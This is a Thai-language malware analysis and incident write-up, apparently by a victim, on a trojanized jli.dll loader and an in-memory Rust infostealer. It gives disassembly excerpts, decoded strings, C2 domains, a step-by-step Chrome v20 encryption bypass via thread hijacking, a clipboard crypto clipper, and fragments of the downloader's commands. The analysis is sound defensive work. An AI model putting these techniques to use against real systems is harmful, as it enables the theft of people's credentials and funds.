   `jli.dll` มีการ Import เฉพาะฟังก์ชันพื้นฐานของ C Runtime จาก `kernel32.dll` และ `api-ms-win-core-synch-l1-2-0.dll` เท่านั้น ฟังก์ชันที่เหลือที่มันต้องใช้ (`VirtualAlloc`, `LoadLibraryA`, `GetProcAddress`, `GetSystemMetrics`, `GetLogicalDrives`, `Sleep`, `RtlGetCurrentPeb`) ถูกเก็บเป็นข้อความเข้ารหัสแล้วค่อยหาตำแหน่งตอนรัน

#### วิเคราะห์ Assembly ของ `JLI_Launch` (`0x18000477b`) และ Control-Flow Flattening
เมื่อ `javaw.exe` เรียกเข้ามาที่ `JLI_Launch` (`0x18000477b`) โค้ดส่วนแรกจะทำการเช็คค่าใน Thread Local Storage (`gs:0x58`) เทียบกับค่าคงที่ `0x93e329d8`:

```x86asm
18000477b:  56                      push   rsi
18000477c:  57                      push   rdi
18000477d:  53                      push   rbx
18000477e:  48 81 ec 90 01 00 00    sub    rsp, 0x190
180004785:  8b 05 89 e6 0a 00       mov    eax, DWORD PTR [rip+0xae689]    # TLS index @ 0x1800b2e14
18000478b:  65 48 8b 0c 25 58 00    mov    rcx, QWORD PTR gs:0x58          # TEB->ThreadLocalStoragePointer
180004792:  00 00
180004794:  48 8b 04 c1             mov    rax, QWORD PTR [rcx+rax*8]
180004798:  48 8d 80 70 00 00 00    lea    rax, [rax+0x70]
18000479f:  8b 00                   mov    eax, DWORD PTR [rax]
1800047a1:  48 8d 74 24 32          lea    rsi, [rsp+0x32]
1800047a6:  3d d8 29 e3 93          cmp    eax, 0x93e329d8
1800047ab:  0f 85 b0 00 00 00       jne    0x180004861
```

ความยากในการแกะ `jli.dll` คือโค้ดตลอดทั้ง `.text` (`0x180001000` – `0x180014fff`) ถูกใส่ **OLLVM-style Control-Flow Flattening (CFF)** ร่วมกับ **Mixed Boolean-Arithmetic (MBA)** โดยแทนที่จะใช้คำสั่งกระโดดแบบปกติ โค้ดแต่ละบล็อกจะคำนวณสถานะด้วย `sete` / `cmove` / `cmovb` แล้วไปดึงค่า Offset 32-bit จากตาราง Jump Table ใน `.rdata` (`0x1800a7000+`) มาบวกกับ Base Register (`r9`, `r12` หรือ `r13`) แล้วกระโดดด้วย `jmp r11` / `jmp r10` / `jmp rcx`:

```x86asm
180001315:  41 bb fb 2e 6e d7       mov    r11d, 0xd76e2efb
18000131b:  45 2b df                sub    r11d, r15d
18000131e:  45 31 d2                xor    r10d, r10d
180001321:  45 8b db                mov    r11d, r11d
180001324:  4c 39 da                cmp    rdx, r11
180001327:  41 0f 94 c2             sete   r10b
18000132b:  41 c1 e2 06             shl    r10d, 0x6
18000132f:  4f 63 9c 0a b8 01 00 00 movsxd r11, DWORD PTR [r10+r9*1+0x1b8]
180001337:  4d 03 dd                add    r11, r13
18000133a:  41 ff e3                jmp    r11
```

พอไล่ State Machine มั่วๆ ของมันจนจบ จริงๆ มันทำแค่ 3 อย่างค่ะ:

1. **ถอด Stage 3 ออกมาจากข้อความ (`0x18000494d`):**
   - Stage 3 ไม่ได้ถูกเข้ารหัสด้วย Cipher จริงจังอะไร มันถูกเก็บไว้ใน `.rdata` ที่ `0x180016159` เป็นข้อความยาว `594,786` ตัวอักษร ใช้วิธีเดียวกับข้อความทั้ง 23 รายการใน `jli.dll` คือเอาแต่ละตัวอักษรไปเทียบกับตารางตัวอักษร 64 ตัวแบบ Custom ที่ `0x1800a78b0` เลื่อนด้วยคีย์ของแต่ละรายการ (`shift = (-key) & 0x3f`) แล้วอัดค่า 6-bit กลับเป็นไบต์
   - มีอีกก้อนเล็กๆ ที่ `0x1800a75f2` (`458` ตัวอักษร) เก็บ PE Header ขนาด `0x400` ไบต์ไว้ โดยลบลายเซ็น `MZ` กับ `PE` ออก ตัวสแกนหน่วยความจำที่หาลายเซ็นพวกนี้เลยหาไม่เจอ
2. **คลายบีบอัดด้วย LZ77:**
   - ข้อมูลที่ถอดออกมาเป็น LZ77 Stream (`off = (w >> 5) + 1`, `len = (w & 0x1f) + 4`) พอคลายแล้วจะได้ข้อมูล Section ขนาด `606,720` ไบต์ (`0x94200`) ของไฟล์ PE64 DLL ที่ชื่อภายในตาราง Export คือ **`build.dll`** โดยไม่มีการเขียนลงดิสก์เลย
3. **Reflective PE Loader (`0x180001110`):**
   - เรียก `VirtualAlloc(NULL, 0x9B400, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)` ที่ `0x180001abe` จองหน่วยความจำ RWX ก้อนเดียวสำหรับทั้งไฟล์ ซึ่งตรงนี้ก็เป็นจุดสังเกตที่ดีเวลาทำ Memory Forensics
   - คัดลอก Header ขนาด `0x400` ไบต์ (`180001358: mov edx, 0x400`) เขียนไบต์ `MZ`/`PE` กลับที่ Offset `0` และ `e_lfanew` (`0x40`) แล้ววางทั้ง **8 Sections** ของ `build.dll` (`SizeOfImage` `0x9b000`, `180001348: mov r8d, 0x9b000`) ลงไป คอลัมน์ Flags คือค่าที่ Header ของแต่ละ Section ประกาศไว้ แต่ตัว Loader ไม่สนใจ ปล่อยทุกอย่างเป็น RWX หมด:

   | ชื่อ Section | Virtual Address | Virtual Size | Raw Offset | Raw Size | Flags ใน Header |
   |---|---|---|---|---|---|
   | `.text` | `0x1000` | `0x766f6` | `0x400` | `0x76800` | `r-x` (`PAGE_EXECUTE_READ`) |
   | `.rdata` | `0x78000` | `0x15244` | `0x76c00` | `0x15400` | `r--` (`PAGE_READONLY`) |
   | `.data` | `0x8e000` | `0x59a0` | `0x8c000` | `0x5000` | `rw-` (`PAGE_READWRITE`) |
   | `.pdata` | `0x94000` | `0x2010` | `0x91000` | `0x2200` | `r--` |
   | `.fptable` | `0x97000` | `0x100` | `0x93200` | `0x200` | `rw-` |
   | `.tls` | `0x98000` | `0x241` | `0x93400` | `0x400` | `rw-` |
   | `_RDATA` | `0x99000` | `0x444` | `0x93800` | `0x600` | `r--` |
   | `.reloc` | `0x9a000` | `0x714` | `0x93e00` | `0x800` | `r--` |

   - เชื่อม Import **94** รายการจากตาราง `[HintName_RVA, IAT_RVA]` ที่ `0x180015020` (ผ่าน `LoadLibraryA` / `GetProcAddress`), ปรับค่า Relocation **855** จุดจากลิสต์ที่ `0x1800153c8` และสร้าง `LDR_DATA_TABLE_ENTRY` ปลอมไว้ที่ `base + 0x9B000` ชื่อ `"\x01!OyZ.dll"` (`DllBase` = base, `EntryPoint` = `base + 0x755f0`, `SizeOfImage` = `0x9B000`) ให้ดูเหมือน Module ที่โหลดตามปกติ จากนั้นเรียก Entry Point **ครั้งเดียว** ที่ `0x180003141` (`call [rsp+0x128]`) ด้วยพารามิเตอร์ `(base, DLL_PROCESS_ATTACH, 0)` ไม่มีการเรียก Export อื่น

---

### Stage 3: ชำแหละ `build.dll` (In-Memory Infostealer, Chrome `v20` Bypass & Clipper)

มาถึงตัวจริงละค่ะ ดึง Stage 3 ออกจาก RAM มาประกอบ PE ใหม่เป็นไฟล์ `unpacked_build_full.dll` ขนาด `607,744` ไบต์ (SHA-256 `dd81a7c12465d70e85e59ee49c1ed9fe4c9b4d2d65ea4b7e1857b84985444653`) แล้ว Disassemble ทั้ง `.text` (`0x180001000` – `0x1800776f6`) เจอว่าโค้ดหน้าตา**เหมือนคอมไพล์มาจาก Rust** (รูปแบบ Allocator/Drop ของ Rust และ `Once` ที่ใช้ `WaitOnAddress` เหมือน `jli.dll` เป๊ะ) และตั้ง `DllCharacteristics = 0x100` (เปิดแค่ `NX_COMPAT` ไม่ต้องมี ASLR/CFG เพราะยังไงก็ Reflective Map อยู่ใน RAM อยู่แล้ว) แบบนี้ค่ะ

#### 1. การเข้ารหัสข้อความ 512 ชุด (`0x180031d4a`) และตาราง C2 แบบ XOR
ถ้าลอง `strings` ใส่ `build.dll` ตรงๆ แทบไม่เจออะไรเลยค่ะ เพราะข้อความสำคัญและชื่อฟังก์ชัน API ทั้งหมด **512 รายการ** ใน `.rdata` ถูกเข้ารหัสไว้ 2 ชั้น:
1. **Custom Rotated Base64:** แต่ละข้อความจะมีค่าตัวเลขการเลื่อน (`shift` ตั้งแต่ `1` ถึง `63`) เพื่อใช้หมุนตารางตัวอักษร Base64 แบบกำหนดเองก่อนถอดรหัส
2. **LZ77 Decompression:** นำผลลัพธ์ที่ได้จากขั้นแรกมาคลายการบีบอัดด้วย LZ77 ออกมาเป็นข้อความจริงในขณะรัน

เราเลยเขียนสคริปต์ถอดทั้ง 512 ตัวออกมา (`disasm/payload_decoded_strings_all.txt`) ออกมาครบหมดเลย ตัวอย่างบางส่วน (มีคำด่าภาษารัสเซียแปะไว้ด้วย คนเขียนคงเกลียดนักวิจัยมากแหละ):

```text
0x180078f99 (shift=40): '.cmd'
0x180078fa6 (shift=39): 'POST'
0x180079027 (shift=28): 'GetClipboardSequenceNumber\x00'
0x1800791d8 (shift=12): 'CryptUnprotectMemory\x00'
0x1800796c3 (shift=17): 'Thread32First\x00'
0x180079739 (shift=12): '\t.ROBLOSECURITY\t'
0x1800797fc (shift=63): 'CreateProcessWithTokenW\x00'
0x180079c0d (shift= 2): 'SuspendThread\x00'
0x180079cae (shift=26): 'WriteProcessMemory\x00'
0x18007a20c (shift= 9): 'SetThreadContext\x00'
0x18007c3ba (shift= 1): 'your lovely warden\x00'
0x18007cdcb (shift=14): 'нахуй крыс, я не люблю этих снитчей'
```

ในขณะที่รายชื่อโดเมน C2 ทั้ง 3 ตัวและเลข Campaign UUID ถูกเก็บแยกไว้ใน `.rdata` ด้วยการเข้ารหัสแบบ Single-byte XOR (แต่ละโครงสร้างเก็บค่า XOR key 1 ไบต์, ชื่อโดเมนที่เข้ารหัส, หมายเลขพอร์ต `0x01bb` = `443` และแฟล็ก HTTPS = `1`):

| ข้อมูล | ตำแหน่ง Virtual Address | คีย์ XOR | ค่าที่ถอดรหัสได้ |
|---|---|---|---|
| เซิร์ฟเวอร์ C2 หลัก | `0x18007e4ed` | `0x8d` | **`dtapi.cc`** (`HTTPS/443`) |
| เซิร์ฟเวอร์ C2 สำรองที่ 2 | `0x18007d214` | `0xe5` | **`x1zsp.cc`** (`HTTPS/443`) |
| เซิร์ฟเวอร์ C2 สำรองที่ 3 | `0x180079451` | `0xd9` | **`cfmlapi.cc`** (`HTTPS/443`) |
| Campaign / Botnet UUID | `0x18007c6ff` | `0x43` | **`01a12b22-5ca2-7f90-849a-8304fc081a08`** |

การเรียกใช้ Win32 API ทุกตัวใน `build.dll` จะเรียกผ่านฟังก์ชันตัวกลางที่ **`0x18004417a`** ซึ่งจะรับชื่อไฟล์ DLL และชื่อฟังก์ชันที่เพิ่งถอดรหัสเสร็จไปหาตำแหน่งด้วย `LoadLibraryA` / `GetProcAddress` แบบ Dynamic ทั้งหมด

#### 2. แผนผังฟังก์ชันทั้งหมดภายใน `build.dll` (Function Call & Capability Map)

| ช่วงตำแหน่งฟังก์ชัน (VA) | ขนาด | หน้าที่การทำงาน และ API / ข้อความสำคัญที่ใช้ |
|---|---|---|
| `0x18002a15e..0x18002e2bc` | `0x415e` | **ฟังก์ชันควบคุมหลักและส่งข้อมูลออก (Main Orchestrator & Exfiltration):** เรียกเช็ค VM (`0x18001f879`), เช็คภาษาเครื่อง (`0x180055579`), รวบรวมข้อมูล, บีบอัดด้วย `RtlCompressBuffer` (`0x180015a54`) และส่ง `POST /` ไปยัง C2 มีข้อความภาษารัสเซียฝังอยู่คือ `'нахуй крыс, я не люблю этих снитчей'` (*"ช่างแม่xพวกหนูสกปรก กูไม่ชอบพวกขี้ฟ้อง"*) |
| `0x18001f879..0x1800210b0` | `0x1837` | **ตรวจจับ Virtual Machine / Hypervisor:** เช็คค่า CPUID เทียบกับรายชื่อ Hypervisor 31 ตัว (`VMwareVMware`, `VBoxVBoxVBox`, `KVM`, `XenVMMXenVMM`, `prl hyperv`, `TCGTCGTCGTCG`, `bhyve bhyve`, `HAXMHAXMHAXM`, `IntelTDX    `, `Linux KVM Hv`, `NoirVisor ZT` ฯลฯ) และเช็คชื่อการ์ดจอจำลอง (`Virtio`, `Standard VGA`, `Basic Display`) |
| `0x180055579..0x18005b3a5` | `0x5e2c` | **ระบบยกเว้นประเทศกลุ่ม CIS & เก็บข้อมูลเครื่อง:** เรียก `GetUserDefaultLocaleName`, `LCIDToLocaleName` และอ่าน `HKCU\Keyboard Layout\Preload` เทียบกับรหัสภาษา `uk, uz, az, hy, tg, tk, ky, kk, be, ru, ro-md` (ถ้าตรงจะหยุดทำงานทันที) พร้อมดึงข้อมูลรุ่น OS (`RtlGetVersion`), CPU/RAM (`GetSystemInfo`, `GlobalMemoryStatusEx`), GPU (`EnumDisplayDevicesW`), เลข Serial ดิสก์ (`GetVolumeInformationW`) และรายชื่อโปรแกรมที่ติดตั้งจาก `HKLM\...\Uninstall` |
| `0x180004082..0x180006eec` | `0x2e6a` | **โมดูลเจาะเบราว์เซอร์ตระกูล Chromium:** กวาดหาโฟลเดอร์ `User Data\(Default|Profile *)` ใน `%LOCALAPPDATA%` และ `%APPDATA%` เพื่อดึง `Local State`, `Login Data`, `Login Data For Account`, `logins_alt`, `Web Data`, `History`, `Preferences`, `Network\Cookies` และ `Local Storage\leveldb` |
| `0x1800634a3..0x1800643a5` | `0x0f02` | **การสร้าง Hidden Desktop สำหรับเจาะ Chrome `v20`:** อ่านค่า `app_bound_encrypted_key` / `master_app_bound_encrypted_key` จาก `Local State` และเรียก `user32!CreateDesktopA` เพื่อสร้างหน้าจอจำลองที่มองไม่เห็น (`CloseDesktop` เมื่อเสร็จงาน) |
| `0x1800601c8..0x1800620d2` | `0x1f0a` | **การสวมรอยสิทธิ์ Token ของผู้ใช้ (Token Impersonation):** หา PID ของ Explorer จาก `GetShellWindow` -> `GetWindowThreadProcessId` แล้วเรียก `OpenProcess` -> `OpenProcessToken` -> `DuplicateTokenEx` เพื่อสั่งรันเบราว์เซอร์ภายใต้ Token ของผู้ใช้จริงด้วย `CreateProcessWithTokenW` |
| `0x18000b161..0x180013537` | `0x83d6` | **โมดูล Thread Hijacking & ดูดกุญแจ Chrome `v20` จาก RAM:** ไล่หา Process และ Thread (`NtQuerySystemInformation`, `CreateToolhelp32Snapshot`, `Thread32First`/`Next`), เปิดเข้าถึงเบราว์เซอร์ (`OpenProcess`, `OpenThread`), หยุดการทำงานของ Thread (`SuspendThread`), จองพื้นที่และฉีดโค้ด (`VirtualAllocEx`, `WriteProcessMemory`), แก้ตำแหน่ง `RIP` (`GetThreadContext` -> `SetThreadContext`), สั่งรันต่อ (`ResumeThread`) แล้วกวาดอ่านกุญแจ `v20` ที่ถอดรหัสแล้วจากหน่วยความจำ (`VirtualQueryEx`, `ReadProcessMemory`, `CryptUnprotectMemory`) |
| `0x18003ec1c..0x180040ccc` | `0x20b0` | **โมดูลขโมย Browser Extensions:** กวาดโฟลเดอร์ `\Local Extension Settings` และ `\Extensions` โดยข้ามตัวที่ชื่อหรือ ID ตรงกับ Blacklist ขนาด `5,390` ตัวอักษรที่ `0x18007aace` (276 รายการ: Ad-blocker, Extension แอนตี้ไวรัส/ความปลอดภัย, เครื่องมือทั่วไป และ Extension ID อีก 60 ตัว) นอกนั้นโดนดูดหมด ปลั๊กอินกระเป๋าคริปโตกับ 2FA เลยโดนไปด้วย ไม่ได้มีลิสต์ ID กระเป๋าคริปโตแยกไว้โดยเฉพาะ |
| `0x1800423cc..0x180043db3` | `0x19e7` | **โมดูลเจาะเบราว์เซอร์ตระกูล Gecko (Zen Browser / Firefox):** กวาด `%APPDATA%\<browser>\Profiles\*` เพื่อขโมย `key4.db`, `logins.json`, `logins.db`, `cookies.sqlite`, `places.sqlite`, `formhistory.sqlite`, `autofill-profiles.json` และ `storage\default` |
| `0x180044cf6..0x18004e929` | `0x9c33` | **โมดูลถอดรหัส Discord, Steam และ Roblox:** ค้นหาคำว่า `dQw4w9WgXcQ:` ในไฟล์ `.ldb`/`.log` ของ Discord และ Discord PTB, ถอดรหัสกุญแจ `encrypted_key` จาก `Local State` ด้วย `CryptUnprotectData` (`0x18002ea17`) แล้วถอดรหัส Token ด้วย `bcrypt!BCryptOpenAlgorithmProvider("AES")` + `ChainingModeGCM` + `BCryptDecrypt` บันทึกลง `tokens.txt` (`0x180053091`) รวมถึงดึงไฟล์ Steam (`config\config.vdf`, `Steam\local.vdf` `ConnectCache`) และเรียกโมดูล Roblox (`0x18001c972`) |
| `0x18001c972..0x18001d651` | `0x0cdf` | **โมดูลถอดรหัสคุกกี้ Roblox (`.ROBLOSECURITY`):** อ่านไฟล์ `%LOCALAPPDATA%\Roblox\LocalStorage\RobloxCookies.dat` ดึงค่า `CookiesData` มาแปลง Base64 ด้วย `CryptStringToBinaryA` (`0x1800345be`) และถอดรหัส DPAPI ด้วย `CryptUnprotectData` |
| `0x18005c9f6..0x18005e5b5` | `0x1bbf` | **โมดูลแคปภาพหน้าจอความละเอียดจริง:** เรียก `SetProcessDPIAware` -> `GetSystemMetrics` -> `GetDC(NULL)` -> `CreateCompatibleDC` -> `CreateCompatibleBitmap` -> `BitBlt` -> `GetDIBits` แล้วเติมหัวไฟล์ BMP (`BM`) |
| `0x180015a54..0x18001a0e6` | `0x4692` | **การบีบอัดข้อมูลใน RAM:** ใช้ `ntdll!RtlGetCompressionWorkSpaceSize` และ `ntdll!RtlCompressBuffer` บีบอัดก้อนข้อมูลทั้งหมดก่อนส่ง |
| `0x18003c0d4..0x18003e4a6` | `0x23d2` | **การส่งข้อมูลผ่าน HTTPS:** ใช้ `WinHttpOpen` -> `WinHttpConnect` -> `WinHttpOpenRequest("POST", "/")` -> `WinHttpSendRequest` ส่งข้อมูลออกทางพอร์ต `443` |
| `0x1800277a6..0x180029944` | `0x219e` | **โมดูลสลับเลขกระเป๋าคริปโตใน Clipboard (Clipper):** วนลูป `Sleep(300)` เช็ค `GetClipboardSequenceNumber` ทุกๆ 300ms ถ้าข้อความใน Clipboard ขึ้นต้นด้วย `bc1`, `ltc1`, `bitcoincash:`, `EQ`, `UQ` หรือ `addr1` จะใช้ `OpenClipboard` -> `EmptyClipboard` -> `SetClipboardData` สลับเป็นกระเป๋าของคนร้ายทันที |
| `0x1800662e1..0x18006827b` | `0x1f9a` | **โมดูลดาวน์โหลดและรันไฟล์เสริม (Secondary Loader):** ดาวน์โหลดไฟล์ลง `%TEMP%` ด้วย `curl.exe -fs -o` หรือ `certutil.exe -urlcache -split` แล้วสั่งรัน `.exe` (`CreateProcessW`), `.msi` (`msiexec.exe /i /qn /norestart`), `.ps1` (`powershell.exe -ex bypass -File`), `.bat`/`.cmd` (`cmd.exe`) หรือผ่าน COM `IShellDispatch` (`CoCreateInstance`) |

#### 3. วิธีที่ `build.dll` ใช้ข้ามระบบป้องกัน Chrome `v20` App-Bound Encryption
ตั้งแต่ Chrome 127 เป็นต้นมา ข้อมูลรหัสผ่านใน `Login Data` และคุกกี้ใน `Network\Cookies` จะถูกเข้ารหัสด้วยกุญแจเวอร์ชันใหม่ที่ขึ้นต้นด้วย `v20` โดยเก็บกุญแจที่เข้ารหัสไว้ในไฟล์ `Local State` ชื่อ `os_crypt.app_bound_encrypted_key` ซึ่งไม่สามารถใช้ `CryptUnprotectData` (DPAPI ปกติ) ถอดรหัสตรงๆ ได้อีกต่อไป เพราะ Chrome ผูกสิทธิ์การถอดรหัสไว้กับเซอร์วิส `elevation_service.exe` ที่จะยอมถอดรหัสให้เฉพาะกรณีที่ Process ที่เรียกเข้ามาคือไฟล์ `chrome.exe` ของแท้เท่านั้น

แล้วมันข้ามยังไง แถมไม่ต้องใช้สิทธิ์ Admin ด้วย:
1. ฟังก์ชัน `0x1800634a3` เรียก `CreateDesktopA` เพื่อสร้างหน้าจอจำลองที่ซ่อนอยู่ข้างหลัง (Hidden Desktop) ทำให้เวลาสั่งเปิดเบราว์เซอร์จะไม่มีหน้าต่างใดๆ เด้งขึ้นมาให้ผู้ใช้เห็นบนหน้าจอหลัก
2. ฟังก์ชัน `0x1800601c8` ดึง Token ของผู้ใช้ปัจจุบันจาก `GetShellWindow` -> `OpenProcessToken` -> `DuplicateTokenEx` แล้วสั่งเปิดหรือเข้าถึง Process ของเบราว์เซอร์บน Hidden Desktop นั้น
3. ฟังก์ชัน `0x18000b161` ค้นหา Thread ของเบราว์เซอร์ผ่าน `CreateToolhelp32Snapshot` (`Thread32First` / `Thread32Next`) เปิด Handle ของ Thread ด้วย `OpenThread` แล้วสั่งหยุดการทำงานชั่วคราวด้วย `SuspendThread`
4. จองพื้นที่หน่วยความจำภายใน Process ของ `chrome.exe` ด้วย `VirtualAllocEx` เขียน Shellcode ลงไปผ่าน `WriteProcessMemory` แล้วดึงค่า Register ปัจจุบันด้วย `GetThreadContext` เพื่อแก้ตำแหน่ง `RIP` ให้ชี้ไปยังโค้ดที่ฉีดเข้าไปด้วย `SetThreadContext` ก่อนจะสั่ง `ResumeThread`
5. เนื่องจากโค้ดที่ฉีดเข้าไปทำงานอยู่ภายใต้บริบทของ `chrome.exe` ของแท้ ทำให้กุญแจ `v20` ถูกถอดรหัสออกวางไว้ในหน่วยความจำ จากนั้นตัวมัลแวร์จะใช้ `VirtualQueryEx` + `ReadProcessMemory` + `CryptUnprotectMemory` เพื่อดูดกุญแจ `master_encryption_key` ขนาด 32 ไบต์ออกมาจาก RAM ของเบราว์เซอร์ แล้วสั่งปิดเบราว์เซอร์ที่ซ่อนอยู่ทิ้งด้วย `TerminateProcess` (`0x180015708`)
6. เมื่อได้กุญแจ `v20` ขนาด 32 ไบต์มาแล้ว ฟังก์ชัน `0x180004082` ก็สามารถนำมาถอดรหัส AES-256-GCM กับรหัสผ่านและคุกกี้ `v20` ทุกตัวในเครื่องได้ทันทีค่ะ

---

## สรุปความเสียหาย: เราโดนดูดข้อมูลอะไรออกไปบ้าง?

รู้ว่าตัวขโมยทำอะไรได้ยังไม่พอ ต้องรู้ด้วยว่าบัญชีไหนของเราหลุดจริงบ้าง เราเลยเขียนสคริปต์จำลองขั้นตอนการถอดรหัสของมัลแวร์ (`dfir_dpapi.ps1`, `appb.ps1`, `cng.ps1`) เพื่อตรวจสอบว่ามีข้อมูลชิ้นไหนบ้างที่มัลแวร์สามารถถอดรหัสออกไปเป็น Plaintext ได้สำเร็จ จะได้ตามไปเปลี่ยนรหัสผ่านและยกเลิก Session ได้ครบทุกจุดค่ะ:

1. **Google Chrome (5 โปรไฟล์):**
   - **รหัสผ่านที่บันทึกไว้ 564 รายการ** (จากทั้งหมด 699 รายการ) ที่ถูกเข้ารหัสแบบ `v20` App-Bound Encryption ถูกถอดรหัสออกได้ทั้งหมด
   - **คุกกี้ (Cookies) จำนวน 2,282 รายการ**, ข้อมูล Autofill (`Web Data`), ประวัติการเข้าเว็บ (`History`) และ `Local Storage\leveldb`
2. **Zen Browser (`%APPDATA%\zen\Profiles\*`):**
   - เนื่องจากฐานข้อมูล `key4.db` ไม่ได้ตั้งค่า Firefox Primary Password เอาไว้ (ใช้รหัสผ่านว่าง `""` คู่กับ `global_salt`) ทำให้สามารถถอดรหัส NSS 3DES/AES-CBC แบบ Offline ได้ทันที ส่งผลให้**รหัสผ่าน 41 รายการ** ใน `logins.json` และ**คุกกี้จาก 585 โดเมน** ใน `cookies.sqlite` หลุดออกไปทั้งหมด ซึ่งในนั้นมีคุกกี้ `sessionid` ของ Instagram เราอยู่ด้วย คนร้ายเลยเข้า IG เราได้โดยไม่ต้องรู้รหัสผ่านเลยค่ะ
3. **Vivaldi Browser (`%LOCALAPPDATA%\Vivaldi\User Data\Default`):**
   - รหัสผ่านและคุกกี้ที่เข้ารหัสด้วย DPAPI `v10` มาตรฐาน
4. **Discord และ Discord PTB (`%APPDATA%\discord` & `%APPDATA%\discordptb`):**
   - ไฟล์ `.ldb` และ `.log` ใน `Local Storage\leveldb` ที่มีโทเคน `dQw4w9WgXcQ:` ถูกถอดรหัสด้วยกุญแจ `encrypted_key` จาก `Local State` ผ่าน `BCryptDecrypt` (`AES-256-GCM`) ได้เป็น Token ของทั้งบัญชีหลักและบัญชีรองของเรา
5. **Steam และ Roblox:**
   - ไฟล์ `config\config.vdf`, `loginusers.vdf` และ `%LOCALAPPDATA%\Steam\local.vdf` (`ConnectCache` ของ Steam)
   - ไฟล์ `%LOCALAPPDATA%\Roblox\LocalStorage\RobloxCookies.dat` (คุกกี้ `.ROBLOSECURITY` ของ Roblox)
6. **ทุกอย่างที่เคยพิมพ์หรือเซฟไว้ในเบราว์เซอร์:**
   - **ข้อมูล Autofill:** ชื่อ ที่อยู่ เบอร์โทร และเลขบัตรประชาชนที่เคยกรอกฟอร์มในเว็บราชการกับเว็บโรงเรียน
   - **ข้อมูลบัตรที่เซฟไว้:** ใน Chrome มีแค่ข้อมูลบัตรแบบปิดเลขของ Google Pay (ประเภทบัตร เลข 4 ตัวท้าย วันหมดอายุ ชื่อบนบัตร) ไม่มีเลขบัตรเต็มเซฟไว้ในนั้นค่ะ
   - **ประวัติการเข้าเว็บ** จาก Chrome และ Zen
   - **ข้อมูลของ Browser Extension** มันเก็บข้อมูลของทุก Extension ที่ติดตั้งไว้ ยกเว้นตัวที่อยู่ในลิสต์ข้าม 276 รายการ (พวก Ad-blocker แอนตี้ไวรัส และ Extension ทั่วไป) ซึ่ง Extension กระเป๋าคริปโต (MetaMask, Phantom ฯลฯ) กับ Extension 2FA หรือ Password Manager ไม่อยู่ในลิสต์นั้น เลยโดนไปด้วยค่ะ
7. **ข้อมูลของตัวเครื่อง:** ภาพหน้าจอเต็มจอความละเอียดจริง ณ ตอนนั้น ชื่อผู้ใช้ Windows ชื่อเครื่อง สเปคเครื่อง และรายชื่อโปรแกรมทั้งหมดที่ติดตั้งไว้
8. **จาก Stage 1 ก่อนตัวขโมยจะเริ่มทำงานอีก:** 15 นาทีหลังรันทุกครั้ง ตัว Extension ส่งรายชื่อ Process ทั้งหมด (พร้อม Command line) และชื่อไฟล์ใหม่ในโฟลเดอร์ `AppData`, `Temp` และ `Public` กลับไปที่ `geaix.com` ด้วย

**แล้วกระเป๋าคริปโตล่ะ?** ตัวนี้เล่นงานคริปโตอยู่ 3 ทาง:
- **Extension กระเป๋าคริปโตในเบราว์เซอร์:** มันก๊อปไฟล์ Vault ที่เข้ารหัสไว้ออกไป พอคนร้ายมีไฟล์นี้ ก็เอาไปนั่งเดารหัสกระเป๋าแบบ Offline ได้เรื่อยๆ ไม่มีจำกัด
- **บัญชี Exchange:** รหัสผ่านกับคุกกี้ของเว็บอย่าง Coinbase, Bitkub, Binance ก็โดนขโมยไปเหมือนเว็บอื่นๆ
- **ตัวสลับเลขกระเป๋าใน Clipboard:** ระหว่างที่มันรันอยู่ ถ้าเรา Copy ที่อยู่กระเป๋า Bitcoin, Litecoin, Bitcoin Cash, TON หรือ Cardano มันจะแอบเปลี่ยนเป็นที่อยู่ของคนร้ายทันที ถ้าวางลงหน้าโอนโดยไม่เช็ค เงินก็ไปเข้ากระเป๋าคนร้ายเลยค่ะ

ส่วนแอปกระเป๋าบนเครื่อง (Exodus, Electrum, Atomic, Ledger Live ฯลฯ) ตัวนี้**ไม่ได้**เล็งไว้นะคะ ใน String ที่ถอดรหัสออกมาทั้ง 512 ตัวไม่มีชื่อพวกนี้เลย

แล้วพอรหัสผ่านกับคุกกี้หลุด บัญชีที่ผูกอยู่ก็หลุดตามไปด้วย ไม่ใช่แค่ Discord กับ IG ของเราก็มีบัญชี Google และ Microsoft หลายบัญชี, ProtonMail, Facebook, GitHub, ผู้ให้บริการ Cloud และโดเมน (รวมถึง API key), PayPal และ Exchange คริปโตอีกสองสามที่, Steam, Roblox, Twitter, Twitch และเครื่องมือ AI ทั้งหมดนี้เปลี่ยนรหัสและเตะ Session ออกหมดแล้วค่ะ

อีกเรื่องนึงคือ ตัวขโมยสามารถโหลดโปรแกรมอื่นที่เซิร์ฟเวอร์ส่งมารันเพิ่มได้ด้วย เราไม่เจอ Payload ตัวที่สองบนดิสก์ แต่ก็พิสูจน์ไม่ได้ว่าไม่มีอะไรรันใน RAM เลย เราเลยเลือกล้าง Windows ทิ้งทั้งเครื่อง แทนที่จะลบแค่ไฟล์ไวรัสค่ะ

---

## ใครอยู่เบื้องหลัง?

บอกชื่อไม่ได้นะคะ และหลักฐานในนี้ก็ยืนยันตัวตนใครไม่ได้ แต่เราค่อนข้างสงสัยว่าเป็น**ทีม** ไม่ใช่คนเดียว และน่าจะเป็น**กลุ่มที่พูดภาษารัสเซีย อาจจะอยู่ในรัสเซียหรือประเทศแถวนั้น**

**ทำไมคิดว่าเป็นทีม:**
- **ฉากหน้าคือโปรดักต์ปลอมทั้งตัว:** มีเว็บ `geaix.com` ที่มี Dashboard มีระบบล็อกอิน มี Extension AI ที่ Fork มาจาก Kilo Code แถมมี Changelog ปลอมที่ดูน่าเชื่อ 11 รายการ ไล่ไปจนถึงเวอร์ชัน `1.0.24` ลงแรงเยอะเกินไปสำหรับแค่เหยื่อล่อ
- **หลังบ้านแยกกันเป็นส่วนๆ:** ตัว Dropper คุยกับ `geaix.com` แต่ตัวขโมยข้อมูลส่งไปอีก 3 โดเมน (`dtapi.cc`, `x1zsp.cc`, `cfmlapi.cc`) แถมมี Campaign ID ติดไปด้วย คนคุมจะได้รู้ว่าเหยื่อแต่ละคนมาจากแคมเปญไหน
- **มาจากระบบ Build:** ตัว Loader กับตัวขโมยข้อมูลคอมไพล์ห่างกันแค่ 14 วินาที แปลว่าไม่ใช่งานทำมือครั้งเดียว
- **คนเอา Session ไปใช้ก็เป็นอีกงานนึง:** บอทล็อกอินจาก Los Angeles กับ Cologne หลังจากนั้น 8 วัน แล้วรันสคริปต์สแปมอัตโนมัติ

